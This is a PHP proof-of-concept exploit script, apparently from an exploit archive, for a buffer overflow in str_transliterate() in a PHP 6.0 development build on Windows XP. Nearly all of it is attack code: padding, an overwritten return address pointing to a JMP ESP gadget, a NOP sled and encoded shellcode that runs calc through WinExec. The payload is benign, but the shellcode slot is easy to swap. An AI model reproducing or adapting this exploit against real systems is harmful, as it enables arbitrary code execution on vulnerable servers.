&lt;?php
error_reporting(0);
#####################################################################
## PHP 6.0 Dev str_transliterate() 0Day Buffer Overflow Exploit
## Tested on WIN XP HEB SP3, Apache, PHP 6.0 Dev
## Buffer Overflow
## Bug discovered by Pr0T3cT10n, &lt;pr0t3ct10n@gmail.com&lt;mailto:pr0t3ct10n@gmail.com&gt;&gt;
## Exploited by TheLeader, Debug
## SP. Thanks: HDM
## http://www.nullbyte.org.il
#####################################################################
## This code should exploits a buffer overflow in the str_transliterate() function to call WinExec and execute CALC
## Take a look, &#039;unicode.semantics&#039; has to be on!
## php.ini &gt; unicode.semantics = on
#####################################################################
if(ini_get_bool(&#039;unicode.semantics&#039;)) {
 $buff = str_repeat(&quot;\u4141&quot;, 256);
 $eip = &quot;\u1445\u10A9&quot;; # 0x10A91445 JMP ESP @ php6ts.dll
 $nops = str_repeat(&quot;\u9090&quot;, 20);
 
 # WinExec Calc XP SP3 HEB Unicode-encoded shellcode
 $shellcode = &quot;\u02EB\u05EB\uF9E8\uFFFF\u33FF\u5BC0\u4388\u8315\u11C3\uBB53\u250D\u7C86\uD3FF\u6163\u636C\u414E&quot;;
 
 $exploit = $buff.$eip.$nops.$shellcode;
 str_transliterate(0, $exploit, 0);
} else {
 exit(&quot;Error! &#039;unicode.semantics&#039; has be on!\r\n&quot;);
}
 
function ini_get_bool($a) {
 $b = ini_get($a);
 switch (strtolower($b)) {
  case &#039;on&#039;:
  case &#039;yes&#039;:
  case &#039;true&#039;:
   return &#039;assert.active&#039; !== $a;
  case &#039;stdout&#039;:
  case &#039;stderr&#039;:
   return &#039;display_errors&#039; === $a;
  default:
   return (bool) (int) $b;
 }
}
?&gt;